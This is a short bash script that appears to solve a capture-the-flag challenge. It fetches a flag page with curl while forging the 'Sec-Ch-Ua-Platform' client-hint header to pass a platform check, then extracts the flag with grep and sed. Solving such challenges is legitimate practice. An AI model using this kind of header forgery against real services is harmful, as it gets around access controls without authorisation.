#!/bin/bash

curl -s -H 'Sec-Ch-Ua-Platform: "INTEGRITY-178B"' https://secure-platform.acmcyber.com/flag | grep flag | sed 's/.*\(flag{.*}\).*/\1/'
